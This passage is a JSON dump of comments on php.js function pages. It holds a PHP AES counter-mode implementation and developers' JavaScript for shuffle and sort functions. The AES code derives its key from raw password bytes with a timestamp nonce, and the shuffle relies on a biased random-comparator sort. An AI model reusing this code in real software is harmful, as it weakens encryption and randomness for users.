0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,\r\n               0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,\r\n               0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,\r\n               0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,\r\n               0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,\r\n               0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,\r\n               0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,\r\n               0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,\r\n               0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,\r\n               0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,\r\n               0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,\r\n               0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,\r\n               0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16);\r\n\r\n\/\/ Rcon is Round Constant used for the Key Expansion [1st col is 2^(r-1) in GF(2^8)] [\u00c2\u00a75.2]\r\n$Rcon = array( array(0x00, 0x00, 0x00, 0x00),\r\n               array(0x01, 0x00, 0x00, 0x00),\r\n               array(0x02, 0x00, 0x00, 0x00),\r\n               array(0x04, 0x00, 0x00, 0x00),\r\n               array(0x08, 0x00, 0x00, 0x00),\r\n               array(0x10, 0x00, 0x00, 0x00),\r\n               array(0x20, 0x00, 0x00, 0x00),\r\n               array(0x40, 0x00, 0x00, 0x00),\r\n               array(0x80, 0x00, 0x00, 0x00),\r\n               array(0x1b, 0x00, 0x00, 0x00),\r\n               array(0x36, 0x00, 0x00, 0x00) ); \r\n\r\n\r\n\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n\r\n\/** \r\n * Encrypt a text using AES encryption in Counter mode of operation\r\n *  - see http:\/\/csrc.nist.gov\/publications\/nistpubs\/800-38a\/sp800-38a.pdf\r\n *\r\n * Unicode multi-byte character safe\r\n *\r\n * @param plaintext source text to be encrypted\r\n * @param password  the password to use to generate a key\r\n * @param nBits     number of bits to be used in the key (128, 192, or 256)\r\n * @return          encrypted text\r\n *\/\r\nfunction AESEncryptCtr($plaintext, $password, $nBits) {\r\n  $blockSize = 16;  \/\/ block size fixed at 16 bytes \/ 128 bits (Nb=4) for AES\r\n  if (!($nBits==128 || $nBits==192 || $nBits==256)) return '';  \/\/ standard allows 128\/192\/256 bit keys\r\n  \/\/ note PHP (5) gives us plaintext and password in UTF8 encoding!\r\n\t\r\n  \/\/ use AES itself to encrypt password to get cipher key (using plain password as source for key \r\n  \/\/ expansion) - gives us well encrypted key\r\n  $nBytes = $nBits\/8;  \/\/ no bytes in key\r\n  $pwBytes = array();\r\n  for ($i=0; $i&lt;$nBytes; $i++) $pwBytes[$i] = ord(substr($password,$i,1)) &amp; 0xff;\r\n  $key = Cipher($pwBytes, KeyExpansion($pwBytes));\r\n  $key = array_merge($key, array_slice($key, 0, $nBytes-16));  \/\/ expand key to 16\/24\/32 bytes long \r\n\r\n  \/\/ initialise counter block (NIST SP800-38A \u00c2\u00a7B.2): millisecond time-stamp for nonce in \r\n  \/\/ 1st 8 bytes, block counter in 2nd 8 bytes\r\n  $counterBlock = array();\r\n  $nonce = floor(microtime(true)*1000);   \/\/ timestamp: milliseconds since 1-Jan-1970\r\n  $nonceSec = floor($nonce\/1000);\r\n  $nonceMs = $nonce%1000;\r\n  \/\/ encode nonce with seconds in 1st 4 bytes, and (repeated) ms part filling 2nd 4 bytes\r\n  for ($i=0; $i&lt;4; $i++) $counterBlock[$i] = urs($nonceSec, $i*8) &amp; 0xff; \r\n  for ($i=0; $i&lt;4; $i++) $counterBlock[$i+4] = $nonceMs &amp; 0xff;\r\n  \/\/ and convert it to a string to go on the front of the ciphertext\r\n  $ctrTxt = '';\r\n  for ($i=0; $i&lt;8; $i++) $ctrTxt .= chr($counterBlock[$i]);\r\n\r\n  \/\/ generate key schedule - an expansion of the key into distinct Key Rounds for each round\r\n  $keySchedule = KeyExpansion($key);\r\n  \r\n  $blockCount = ceil(strlen($plaintext)\/$blockSize);\r\n  $ciphertxt = array();  \/\/ ciphertext as array of strings\r\n  \r\n  for ($b=0; $b&lt;$blockCount; $b++) {\r\n    \/\/ set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)\r\n    \/\/ done in two stages for 32-bit ops: using two words allows us to go past 2^32 blocks (68GB)\r\n    for ($c=0; $c&lt;4; $c++) $counterBlock[15-$c] = urs($b, $c*8) &amp; 0xff;\r\n    for ($c=0; $c&lt;4; $c++) $counterBlock[15-$c-4] = urs($b\/0x100000000, $c*8);\r\n\r\n    $cipherCntr = Cipher($counterBlock, $keySchedule);  \/\/ -- encrypt counter block --\r\n\r\n    \/\/ block size is reduced on final block\r\n    $blockLength = $b&lt;$blockCount-1 ? $blockSize : (strlen($plaintext)-1)%$blockSize+1;\r\n    $cipherByte = array();\r\n    \r\n    for ($i=0; $i&lt;$blockLength; $i++) {  \/\/ -- xor plaintext with ciphered counter byte-by-byte --\r\n      $cipherByte[$i] = $cipherCntr[$i] ^ ord(substr($plaintext, $b*$blockSize+$i, 1));\r\n      $cipherByte[$i] = chr($cipherByte[$i]);\r\n    }\r\n    $ciphertxt[$b] = implode('', $cipherByte);  \/\/ escape troublesome characters in ciphertext\r\n  }\r\n\r\n  \/\/ implode is more efficient than repeated string concatenation\r\n  $ciphertext = $ctrTxt . implode('', $ciphertxt);\r\n  $ciphertext = base64_encode($ciphertext);\r\n  return $ciphertext;\r\n}\r\n\r\n\r\n\/** \r\n * Decrypt a text encrypted by AES in counter mode of operation\r\n *\r\n * @param ciphertext source text to be decrypted\r\n * @param password   the password to use to generate a key\r\n * @param nBits      number of bits to be used in the key (128, 192, or 256)\r\n * @return           decrypted text\r\n *\/\r\nfunction AESDecryptCtr($ciphertext, $password, $nBits) {\r\n  $blockSize = 16;  \/\/ block size fixed at 16 bytes \/ 128 bits (Nb=4) for AES\r\n  if (!($nBits==128 || $nBits==192 || $nBits==256)) return '';  \/\/ standard allows 128\/192\/256 bit keys\r\n  $ciphertext = base64_decode($ciphertext);\r\n\r\n  \/\/ use AES to encrypt password (mirroring encrypt routine)\r\n  $nBytes = $nBits\/8;  \/\/ no bytes in key\r\n  $pwBytes = array();\r\n  for ($i=0; $i&lt;$nBytes; $i++) $pwBytes[$i] = ord(substr($password,$i,1)) &amp; 0xff;\r\n  $key = Cipher($pwBytes, KeyExpansion($pwBytes));\r\n  $key = array_merge($key, array_slice($key, 0, $nBytes-16));  \/\/ expand key to 16\/24\/32 bytes long\r\n  \r\n  \/\/ recover nonce from 1st element of ciphertext\r\n  $counterBlock = array();\r\n  $ctrTxt = substr($ciphertext, 0, 8);\r\n  for ($i=0; $i&lt;8; $i++) $counterBlock[$i] = ord(substr($ctrTxt,$i,1));\r\n  \r\n  \/\/ generate key schedule\r\n  $keySchedule = KeyExpansion($key);\r\n\r\n  \/\/ separate ciphertext into blocks (skipping past initial 8 bytes)\r\n  $nBlocks = ceil((strlen($ciphertext)-8) \/ $blockSize);\r\n  $ct = array();\r\n  for ($b=0; $b&lt;$nBlocks; $b++) $ct[$b] = substr($ciphertext, 8+$b*$blockSize, 16);\r\n  $ciphertext = $ct;  \/\/ ciphertext is now array of block-length strings\r\n\r\n  \/\/ plaintext will get generated block-by-block into array of block-length strings\r\n  $plaintxt = array();\r\n  \r\n  for ($b=0; $b&lt;$nBlocks; $b++) {\r\n    \/\/ set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)\r\n    for ($c=0; $c&lt;4; $c++) $counterBlock[15-$c] = urs($b, $c*8) &amp; 0xff;\r\n    for ($c=0; $c&lt;4; $c++) $counterBlock[15-$c-4] = urs(($b+1)\/0x100000000-1, $c*8) &amp; 0xff;\r\n\r\n    $cipherCntr = Cipher($counterBlock, $keySchedule);  \/\/ encrypt counter block\r\n\r\n    $plaintxtByte = array();\r\n    for ($i=0; $i&lt;strlen($ciphertext[$b]); $i++) {\r\n      \/\/ -- xor plaintext with ciphered counter byte-by-byte --\r\n      $plaintxtByte[$i] = $cipherCntr[$i] ^ ord(substr($ciphertext[$b],$i,1));\r\n      $plaintxtByte[$i] = chr($plaintxtByte[$i]);\r\n\t  \r\n    }\r\n    $plaintxt[$b] = implode('', $plaintxtByte); \r\n  }\r\n\r\n  \/\/ join array of blocks into single plaintext string\r\n  $plaintext = implode('',$plaintxt);\r\n  \r\n  return $plaintext;\r\n}\r\n\r\n\r\n\/*\r\n * Unsigned right shift function, since PHP has neither &gt;&gt;&gt; operator nor unsigned ints\r\n *\r\n * @param a  number to be shifted (32-bit integer)\r\n * @param b  number of bits to shift a to the right (0..31)\r\n * @return   a right-shifted and zero-filled by b bits\r\n *\/\r\nfunction urs($a, $b) {\r\n  $a &amp;= 0xffffffff; $b &amp;= 0x1f;  \/\/ (bounds check)\r\n  if ($a&amp;0x80000000 &amp;&amp; $b&gt;0) {   \/\/ if left-most bit set\r\n    $a = ($a&gt;&gt;1) &amp; 0x7fffffff;   \/\/   right-shift one bit &amp; clear left-most bit\r\n    $a = $a &gt;&gt; ($b-1);           \/\/   remaining right-shifts\r\n  } else {                       \/\/ otherwise\r\n    $a = ($a&gt;&gt;$b);               \/\/   use normal right-shift\r\n  } \r\n  return $a; \r\n}\r\n\r\n\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n[\/CODE]"},{"date":"2008-11-19 14:42:18","author":"Mainda Siriwardana","url":"","comment":"hi! Onno Marsman,\r\nI would like to know whether its working on IE(7) and if possible let me know more details about it.  sha1 originally mentionaed is not working properly for binary file.  this code is working fine on FF but not on IE saying &quot;this method is not supported&quot;\r\n\r\nthanks!"},{"date":"2008-11-19 19:22:27","author":"Onno Marsman","url":"","comment":"Mainda: Unfortunately I don't know anything about any sha1 algorithm. I just posted some code I found somewhere in the past. I've been using this code successfully for a long time, also in IE7. So I don't know where your error could have come from.\r\n\r\nLooking at the code from this library: I've been wondering in the past about the following line of code: \r\n[CODE=&quot;Javascript&quot;]\r\nstr = utf8_encode(str);\r\n[\/CODE]\r\nI know this is not part of the sha1 algorithm and is probably necessary because of the way browsers handle character encoding, although I don't really understand it. \r\nYou could try removing this line. Let me know whether it worked."},{"date":"2008-11-25 17:10:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Patrick Schlicher: Thanks for the info!"},{"date":"2009-01-17 00:26:39","author":"G","url":"http:\/\/g.miernicki.com","comment":"fuckin wicked code. nice, neat, small, clean, and very useful :)"},{"date":"2012-06-07 13:11:02","author":"ERASEthemasterswordsman","url":"ERASEthemasterswordsman.com","comment":"Please note that hashing a has is not completely secure, but can be used as an extra precaution (but not recommended):\n\n[CODE]\n<?php\nsha1(md5($string));\n?>\n[\/CODE]"}],"sha1_file":[{"date":"2008-02-08 02:21:59","author":"marrtins","url":"","comment":"Hi!\r\n\r\nIt seems, that php.packed.js is broken. Firebug reports: unmatched ) in regular expression"},{"date":"2008-02-08 16:04:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ marrtins: Thank you, it was an incompatibility between the updated addslashes &amp; stripslashes functions and Dean Edward's Packer.\r\n\r\nFixed by putting the regexes between quotes."}],"shuffle":[{"date":"2008-03-01 22:38:57","author":"Karel Macek","url":"","comment":"Great!\r\n\r\n...nevertheless, are you sure that each permutation is of equal probability?"},{"date":"2008-03-02 00:03:58","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Karel Macek: Though this is code originially by Jonas Raoni Soares Silva, I don't see why not? Enlighten me if you will."},{"date":"2008-03-02 06:06:03","author":"Michael White","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\n\/\/ This function should actually return the array since you cannot pass by reference in JavaScript.\r\n\/\/This way, when you pass it an array that is not in the global namespace you are still able to retrieve the final array.\r\n\r\n\/\/return true;\r\nreturn array;\r\n[\/CODE]\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-02 11:47:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Hi Michael, you can actually pass by reference in javascript, just by using the name of the original parameter. \r\n\r\nSo in this case onfortunately I can not agree with your comment. As long as we can, we should stay true to PHP, to keep the original documentation compatible and to reduce the risk of unexpected behavior leading to bugs in actual programs based on this library. But thanks anyway for your input! If you disagree still, let me know."},{"date":"2008-04-12 20:18:27","author":"Jonas Raoni","url":"","comment":"You can pass as reference indeed, all JavaScript *objects* are passed as reference. But in my version I really preferred to return the array itself, it makes more sense.\r\n\r\nvar x = new Array(1,2,3,4);\r\nshuffle(x);\r\nalert(x);"},{"date":"2008-04-13 12:58:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Generally speaking I agree that it does. But in this project the goal is to really stay true to PHP behavior so you can use these functions as building blocks for bigger projects without producing unexpected behavior. We don't want people to have to debug their projects, and ultimately reach the conclusion that it was because php.js returned a different result than expected. If it currently does in some places it is because of bugs or a lack of time or knowledge to implement it fully compliant. But I feel we should at least not implement different output by design.\r\n\r\nThis is one of the reasons we made php.js namespaced though. It allows people to adjust the behavior of specific functions more easily."},{"date":"2009-02-01 09:33:24","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's an update which gets shuffle() to also work with associative arrays:\r\n\r\n[CODE=&quot;Javascript&quot;]var a  = {5:'a', 2:'3', 3:'c', 4:5, 'q':5}\r\nshuffle(a);\r\n\r\nfunction shuffle( inputArr ) {\r\n    var valArr = [], keyArr=[];\r\n    var k = '', i = 0, sorter = false;\r\n    \r\n    for (k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n    valArr.sort(function() {return 0.5 - Math.random();});\r\n \r\n    for (i = 0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}[\/CODE]"},{"date":"2009-02-01 09:36:16","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, realized there were a few variable declarations left in there that we don't need in this function:\r\n\r\n[CODE=&quot;Javascript&quot;]function shuffle( inputArr ) {\r\n    var valArr = [];\r\n    var k = '', i = 0;\r\n    \r\n    for (k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n    valArr.sort(function() {return 0.5 - Math.random();});\r\n \r\n    for (i = 0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}[\/CODE]"},{"date":"2009-02-01 23:12:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Brilliant! We're steadily moving to a 100% associative aware PHP.JS :D"},{"date":"2009-02-02 03:10:18","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"There are just 4 more by-reference array functions (array_ pop\/push\/shift\/unshift)--harder ones to fix--which need to be fixed to support objects and arrays, but there were a good number more that also need fixing. \r\n\r\nBy the way, these functions also show desirability of configurability, I think, because the default behavior of PHP is to reindex any arrays with numerical indexes (even array_push() !) which doesn't seem so useful to me. \r\n\r\nWould you be open to my allowing a property on the function itself to be used for configuration (which in the future could be controlled by a global package as well). This doesn't really pollute anything. I think I already did this with each() or something like that.\r\n\r\ne.g.,\r\n\r\narray_pop.preserveNumericalIndices = true;\r\n\r\nThis isn't altering the arrays themselves or any user data--just our own functions (something which users probably wouldn't be iterating, and if they were, it certainly isn't PHP behavior)... Of course, the default behavior would be mimicking PHP as much as possible..."},{"date":"2009-02-02 10:25:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: I'm OK with it if you add such a property if it allows for other projects to more easily extend on our functionality. Just keep it modest and add a clear comment as to what purpose it serves plz. Just did array_pop BTW."},{"date":"2009-02-02 12:02:17","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok sure, thanks. I added a comment at array_pop().\r\n\r\nOne other customizability feature I thought of would be making a comment block, to indicate code which can be made static, and thus not be rebuilt into memory each time a function is called. If we get date() working with timezones, for example, this could be a pretty big array. If we do something like this:\r\n\r\n[CODE=&quot;Javascript&quot;]\/*Begin static*\/\r\nvar timezones = ['Azores', etc.];\r\n\/*End static*\/\r\n\/\/ Use timezones in the rest of the function\r\n[\/CODE]\r\n\r\n...the namespaced version could be automated to move such text blocks into the top of the namespacing function for reuse within all of the functions:\r\n\r\n[CODE=&quot;Javascript&quot;](function() {\r\n\r\nvar timezones = ['Azores', etc.]; \/\/ This is only &quot;global&quot; inside this namespacing--it will not become a real global\r\n\r\nvar PHP_JS = function() {\r\n...\r\n};\r\nPHP_JS.prototype = {\r\n    date : function () {\r\n        \/\/ use timezones var\r\n    }\r\n    \/\/ Other date functions can also reuse too (though making a variable like timezones static is useful even if only one function uses it, given its size upon each execution)...\r\n...\r\n};\r\n\r\nwindow.$P = PHP_JS();\r\n})();\r\n[\/CODE]\r\n\r\nThis should help with memory and speed, and solve the problem of keeping things both potentially independent and as part of a package..."},{"date":"2009-02-02 23:32:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: I think the whole point of having a  namespaced version is that it can't possible conflict with other components of an application. Having such variables is thus defeating it's purpose.\r\n\r\nAnd you know how I feel about adding global dependencies to php.js in general.\r\n\r\nI think the gain does not justify the cost in this case."},{"date":"2009-02-03 01:32:35","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry if I wasn't clear.\r\n\r\nIn JavaScript, you can get private static variables, by putting them within:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n(function() {\r\n...\r\n})();[\/CODE]\r\n\r\n...as your namespaced version does. Everything within that block will only be local to that anonymous function--unless globals are referenced (which my suggestion didn't do--I just meant that the timezone variable, etc. would be &quot;global&quot; in the sense of being available to the other PHP functions within the block--not to user code). The only global that should be within that block is this line which assigns the PHP_JS object to the global $P:\r\n\r\n[CODE=&quot;Javascript&quot;]window.$P = PHP_JS();[\/CODE]\r\n\r\nThe other variables not defined within PHP_JS, like &quot;timezone&quot; will still be accessible to PHP_JS (i.e., to any code within the anonymous function), but not to any outside user code.\r\n\r\nSo, it is perfectly safe, and also promotes speed and memory use.\r\n\r\nTry it with a simpler example like this:\r\n\r\n[CODE=&quot;Javascript&quot;](function() {\r\n    \/\/ Private\r\n    var stat = 'PrivateStaticValue';\r\n    \/\/ Global assignment\r\n    window.myGlobal = 'my'+stat; \/\/ To be useful, this could return something more complicated like a public function or object\r\n})();\r\n\r\nalert(myGlobal); \/\/ myPrivateStaticValue\r\nalert(stat); \/\/ &quot;stat is not defined&quot; error\r\n[\/CODE]"},{"date":"2009-02-04 12:15:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Oh, No, I'm sorry I didn't get that in the first place. We would have to work on the compiler for that."},{"date":"2009-02-04 13:42:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Kevin Np... Was just wondering if I could add such things to the functions in the meantime. I wouldn't expect you to need to do anything with them unless you wanted to at some point. Just thought it might be good to start such a convention sooner rather than later..."},{"date":"2009-02-11 02:16:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Well in that case my previous comment about keeping it modest, noninterfereering &amp; well commented apply ;)"},{"date":"2012-04-11 15:35:33","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other\n "}],"sin":[{"date":"2010-01-14 00:00:36","author":"Kambfhase","url":"","comment":"Instead of creating an extra function I recommend\n\n[CODE]\nvar sin = Math.sin;\n[\/CODE]\n\nmfG Hase"},{"date":"2010-01-14 00:16:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kambfhase, Good point. That would be a nice optimization to add to the compiler at some point. In the case of the namespaced version, it could similarly be assigned directly on the prototype (as with a number of the other Math methods)."}],"sort":[{"date":"2009-01-16 11:52:56","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's sort(), rsort(), and usort() which now support objects (though no additions of sorting types for sort() or rsort()):\r\n\r\n[CODE=&quot;Javascript&quot;]function sort (inputArr, sort_flags) {\r\n    var valArr = [], keyArr=[];\r\n    for (var k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n\r\n    var sorter = false;\r\n    \r\n    \/\/ For now only SORT_NUMERIC has a custom sorter\r\n    \/\/ and SORT_REGULAR, SORT_STRING, and SORT_LOCALE_STRING\r\n    \/\/ are all handled with the default sorter \r\n    if (sort_flags === 'SORT_NUMERIC') {\r\n        sorter = function (a, b) {\r\n            return(a - b);\r\n        };\r\n    }\r\n    if (sorter !== false) {\r\n        valArr.sort(sorter);\r\n    } else {\r\n        valArr.sort();\r\n    }\r\n\r\n    for (i=0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n$fruits = {&quot;d&quot; : &quot;lemon&quot;, &quot;a&quot; : &quot;orange&quot;, &quot;b&quot; : &quot;banana&quot;, &quot;c&quot; : &quot;apple&quot;};\r\nsort($fruits);\r\n\r\nvar $output = '';\r\nfor (var $key in $fruits) {\r\n    $val = $fruits[$key];\r\n    $output += $key+' = '+$val+&quot;\\n&quot;;\r\n}\r\nalert($output);\r\n\/*\r\n0 = apple\r\n1 = banana\r\n2 = lemon\r\n3 = orange\r\n*\/[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction rsort (inputArr, sort_flags) {\r\n    var valArr = [], keyArr=[];\r\n    for (var k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n\r\n    var sorter = false;\r\n    \r\n    \/\/ For now only SORT_NUMERIC has a custom sorter\r\n    \/\/ and SORT_REGULAR, SORT_STRING, and SORT_LOCALE_STRING\r\n    \/\/ are all handled with the default sorter \r\n    if (sort_flags === 'SORT_NUMERIC') {\r\n        sorter = function (a, b) {\r\n            return(b - a);\r\n        };\r\n    }\r\n    if (sorter !== false) {\r\n        valArr.sort(sorter);\r\n    } else {\r\n        valArr.sort();\r\n        valArr.reverse();\r\n    }\r\n\r\n    for (i=0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n$fruits = {&quot;d&quot; : &quot;lemon&quot;, &quot;a&quot; : &quot;orange&quot;, &quot;b&quot; : &quot;banana&quot;, &quot;c&quot; : &quot;apple&quot;};\r\n\/\/$fruits = [&quot;lemon&quot;, &quot;orange&quot;, &quot;banana&quot;, &quot;apple&quot;];\r\n\/\/ $fruits = {&quot;d&quot; : &quot;3&quot;, &quot;a&quot; : &quot;1&quot;, &quot;b&quot; : &quot;11&quot;, &quot;c&quot; : &quot;4&quot;};\r\nrsort($fruits);\r\n\/\/ rsort($fruits, 'SORT_NUMERIC');\r\n\r\nvar $output = '';\r\nfor (var $key in $fruits) {\r\n    $val = $fruits[$key];\r\n    $output += $key+' = '+$val+&quot;\\n&quot;;\r\n}\r\nalert($output);\r\n\/* \r\n0 = orange\r\n1 = lemon\r\n2 = banana\r\n3 = apple\r\n*\/[\/CODE]\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]function sort (inputArr, sorter) {\r\n    var valArr = [], keyArr=[];\r\n    for (var k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        valArr.sort(sorter);\r\n    } catch (e) {\r\n        return false;\r\n    }\r\n    for (i=0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n\r\n$stuff = {&quot;d&quot; : &quot;3&quot;, &quot;a&quot; : &quot;1&quot;, &quot;b&quot; : &quot;11&quot;, &quot;c&quot; : &quot;4&quot;};\r\nsort($stuff, function (a, b) {\r\n            return(a-b);\r\n});\r\n\r\nvar $output = '';\r\nfor (var $key in $stuff) {\r\n    $val = $stuff[$key];\r\n    $output += $key+' = '+$val+&quot;\\n&quot;;\r\n}\r\nalert($output);\r\n\/*\r\n0 = 1\r\n1 = 3\r\n2 = 4\r\n3 = 11\r\n*\/\r\n[\/CODE]"},{"date":"2009-01-16 11:54:44","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, forgot to rename the last one to usort()!"},{"date":"2009-01-16 13:05:41","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Actually, please just use this one for usort() instead, as I needed to allow the callback as string. There's also another array implementation: uasort().\r\n\r\n[CODE=&quot;Javascript&quot;]function usort (inputArr, sorter) {\r\n    if (typeof sorter === 'string') {\r\n        sorter = this[sorter];\r\n    }\r\n    else if (sorter instanceof Array) {\r\n        sorter = this[sorter[0]][sorter[1]];\r\n    }\r\n    var valArr = [], keyArr=[];\r\n    for (var k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        valArr.sort(sorter);\r\n    } catch (e) {\r\n        return false;\r\n    }\r\n    for (i=0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n \r\n$stuff = {&quot;d&quot; : &quot;3&quot;, &quot;a&quot; : &quot;1&quot;, &quot;b&quot; : &quot;11&quot;, &quot;c&quot; : &quot;4&quot;};\r\nusort($stuff, function (a, b) {\r\n            return(a-b);\r\n});\r\n[\/CODE]\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]function uasort (inputArr, sorter) {\r\n    if (typeof sorter === 'string') {\r\n        sorter = this[sorter];\r\n    }\r\n    else if (sorter instanceof Array) {\r\n\t\tsorter = this[sorter[0]][sorter[1]];\r\n    }\t\r\n    var valArr = [], keyArr=[], tempKeyVal, tempValue, ret;\r\n\r\n    var sorterNew = function (keyArr, valArr) {\r\n\t\tfor (var i=valArr.length-2; i &gt;=0; i--) {\r\n\t\t\tfor (var j=0; j &lt;= i; j++) {\r\n\t\t\t\tret = sorter(valArr[j+1], valArr[j]);\r\n\t\t\t\tif (ret &lt; 0) {\r\n\t\t\t\t\ttempValue = valArr[j];\r\n\t\t\t\t\tvalArr[j] = valArr[j+1];\r\n\t\t\t\t\tvalArr[j+1] = tempValue;\r\n\t\t\t\t\ttempKeyVal = keyArr[j];\r\n\t\t\t\t\tkeyArr[j] = keyArr[j+1];\r\n\t\t\t\t\tkeyArr[j+1] = tempKeyVal;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n    }\r\n\r\n    for (var k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        sorterNew(keyArr, valArr); \/\/ Sort our new temporary arrays\r\n    }\r\n    catch(e) {\r\n        return false;\r\n    }\r\n    for (i=0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n \r\n$fruits = {&quot;d&quot; : &quot;lemon&quot;, &quot;a&quot; : &quot;orange&quot;, &quot;b&quot; : &quot;banana&quot;, &quot;c&quot; : &quot;apple&quot;};\r\nuasort($fruits, function (a, b) {\r\n  if (a &gt; b)\r\n    return 1;\r\n  if (a &lt; b)\r\n    return -1;\r\n  return 0;\r\n});\r\nvar $output = '';\r\nfor (var $key in $fruits) {\r\n    $val = $fruits[$key];\r\n    $output += $key+' = '+$val+&quot;\\n&quot;;\r\n}\r\nalert($output);\r\n\r\n\/*\r\nc = apple\r\nb = banana\r\nd = lemon\r\na = orange\r\n*\/\r\n[\/CODE]"},{"date":"2009-01-16 13:10:05","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Grrrr. Sorry, the 'i' for loop (in sort(), rsort(), and usort() need to have 'var' added in front)--accidental globals...  Thx, Brett"},{"date":"2009-01-16 23:48:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: What a beautiful moment it  is, when I paste one of your functions, write a testcase, click on 'Play', and 